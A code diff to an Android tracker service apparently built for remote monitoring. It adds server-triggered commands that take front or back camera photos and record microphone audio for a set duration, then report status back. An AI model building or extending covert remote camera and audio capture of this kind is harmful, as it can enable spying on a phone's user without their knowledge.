@@ -177,6 +177,35 @@ class TrackerService : Service() {
                 // Store blocked apps list - the AccessibilityService handles it
                 ApiClient.updateCommandStatus(commandId, "completed")
             }
+            "camera_front" -> {
+                Log.d(TAG, "Capturing front camera photo")
+                RemoteCaptureManager.capturePhoto(this@TrackerService, useFront = true) { success ->
+                    Log.d(TAG, "Front camera result: $success")
+                    try {
+                        ApiClient.updateCommandStatus(commandId, if (success) "completed" else "failed")
+                    } catch (e: Exception) {}
+                }
+            }
+            "camera_back" -> {
+                Log.d(TAG, "Capturing back camera photo")
+                RemoteCaptureManager.capturePhoto(this@TrackerService, useFront = false) { success ->
+                    Log.d(TAG, "Back camera result: $success")
+                    try {
+                        ApiClient.updateCommandStatus(commandId, if (success) "completed" else "failed")
+                    } catch (e: Exception) {}
+                }
+            }
+            "record_audio" -> {
+                val duration = params?.optInt("duration", 30) ?: 30
+                Log.d(TAG, "Recording audio for ${duration}s")
+                ApiClient.updateCommandStatus(commandId, "delivered")
+                RemoteCaptureManager.recordAudio(this@TrackerService, duration) { success ->
+                    Log.d(TAG, "Audio recording result: $success")
+                    try {
+                        ApiClient.updateCommandStatus(commandId, if (success) "completed" else "failed")
+                    } catch (e: Exception) {}
+                }
+            }
             else -> {
                 ApiClient.updateCommandStatus(commandId, "completed")
             }
